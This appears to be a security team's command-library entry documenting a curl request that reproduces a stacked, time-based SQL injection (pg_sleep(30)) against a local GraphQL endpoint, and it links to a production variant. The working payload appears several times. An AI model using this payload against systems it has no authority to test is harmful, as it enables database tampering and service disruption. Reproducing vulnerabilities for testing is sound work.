---
data: >-
  curl -X POST
  http://localhost:8080/graphql?embedded_submission_form_uuid=1%27%3BSELECT%201%3BSELECT%20pg_sleep%2830%29%3B--%27
tags:
  - sql-injection
  - reproduction
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:09.937Z'
id: 69084ccc-bdb5-4873-b358-0d7989550b90
verified: false
validated: true
submitted: true
---
# curl-local-sql-injection-reproduce

## Command

```bash
curl -X POST http://localhost:8080/graphql?embedded_submission_form_uuid=1%27%3BSELECT%201%3BSELECT%20pg_sleep%2830%29%3B--%27
```

## Description

Reproduces SQL injection locally by sending a POST request to the GraphQL endpoint with a payload that injects SQL commands, causing a 30-second delay via pg_sleep.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies HTTP POST method | Yes |
| `http://localhost:8080/graphql` | Local endpoint URL | Yes |
| `embedded_submission_form_uuid=1%27%3BSELECT%201%3BSELECT%20pg_sleep%2830%29%3B--%27` | URL-encoded payload for injection | Yes |

## Examples

### Basic Usage

```bash
curl -X POST http://localhost:8080/graphql?embedded_submission_form_uuid=1%27%3BSELECT%201%3BSELECT%20pg_sleep%2830%29%3B--%27
```

### Advanced Usage

Add `-v` for verbose output:

```bash
curl -v -X POST http://localhost:8080/graphql?embedded_submission_form_uuid=1%27%3BSELECT%201%3BSELECT%20pg_sleep%2830%29%3B--%27
```

## Expected Output

HTTP response after ~30 seconds delay, typically with empty JSON {} or error if not vulnerable.

## Related

- [[commands/curl-prod-sql-injection-reproduce]]
- [[procedures/Reproduce-SQL-Injection-with-Malicious-Payload]]
